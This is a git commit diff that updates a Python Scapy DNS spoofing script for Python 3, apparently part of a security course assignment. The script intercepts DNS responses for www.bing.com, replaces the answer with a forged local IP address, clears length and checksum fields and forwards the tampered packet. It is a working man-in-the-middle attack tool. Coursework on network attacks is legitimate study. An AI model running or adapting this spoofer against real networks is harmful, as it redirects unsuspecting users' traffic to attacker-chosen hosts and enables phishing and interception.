ddba9b51eb1fbb5c7e5fbe10830219f3b3631ea0
acloudtiger <acloudtiger@gmail.com>
2023-01-09 03:59:02 -0500

    assignment3-DNS spoofing for python3

--- dns_spoof.py
+++ dns_spoof.py
@@ -9,7 +9,7 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if "www.bing.com" in str(qname):
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdata="192.168.10.231")
             scapy_packet[scapy.DNS].an = answer
@@ -20,7 +20,7 @@ def process_packet(packet):
             del scapy_packet[scapy.UDP].len
             del scapy_packet[scapy.UDP].chksum
             print(scapy_packet.show())
-            packet.set_payload(str(scapy_packet))
+            packet.set_payload(bytes(scapy_packet))
 
     packet.accept()
 
